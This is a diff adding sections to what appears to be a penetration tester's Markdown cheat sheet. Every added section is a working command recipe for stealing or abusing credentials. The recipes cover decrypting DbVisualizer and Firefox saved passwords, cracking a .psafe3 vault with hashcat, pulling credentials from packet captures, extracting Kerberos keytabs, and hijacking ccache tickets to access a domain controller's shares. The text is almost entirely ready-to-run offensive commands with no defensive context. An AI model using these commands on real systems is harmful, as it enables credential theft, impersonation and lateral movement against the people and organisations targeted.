@@ -185,3 +185,64 @@ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 restic.exe -r E:\restic2\ snapshots
 restic.exe -r E:\restic2\ restore <SNAPSHOT_ID> --target C:\Restore
 ```
+
+## DbVisualizer Credential Decryption
+```bash
+# Creds stored in: Users\<user>\.dbvis\config70\dbvis.xml
+python decrypt-dbvis.py /path/to/dbvis.xml
+# https://gist.github.com/gerry/c4602c23783d894b8d96
+```
+
+## Password Safe (.psafe3) Cracking
+```bash
+hashcat -m 5200 Employee-Passwords_OLD.psafe3 /usr/share/wordlists/rockyou.txt
+# Open with: sudo apt install passwordsafe
+```
+
+## aureport — TTY Logs (Linux, adm group)
+```bash
+aureport --tty | less
+```
+
+## Pcredz — Extract Credentials from PCAP
+```bash
+python3 Pcredz -f /path/to/capture.pcapng
+```
+
+## Firefox Credential Extraction
+```bash
+# Tar up .mozilla dir and bring back to attack box
+python3 firefox_decrypt.py mozilla/firefox/
+```
+
+## Keytab File Extraction
+```bash
+find / -name *keytab* -ls 2>/dev/null
+python3 keytabextract.py /path/to/file.keytab
+
+# Import keytab
+kinit user@DOMAIN -k -t /path/to/file.kt
+```
+
+## ccache Ticket Impersonation
+```bash
+# Find ccache files
+ls -la /tmp | grep krb5cc
+
+# Check if valid
+klist -c /tmp/krb5cc_<uid>_<random>
+
+# Use it
+export KRB5CCNAME=/tmp/krb5cc_<uid>_<random>
+smbclient //DC01/C$ -k -c ls -no-pass
+
+# Convert ccache to kirbi
+impacket-ticketConverter /tmp/file.ccache file.kirbi
+```
+
+## Linikatz — Machine Account Auth
+```bash
+export KRB5CCNAME=FILE:/var/lib/sss/db/ccache_DOMAIN
+klist
+smbclient //DC01/<share> -N
+```
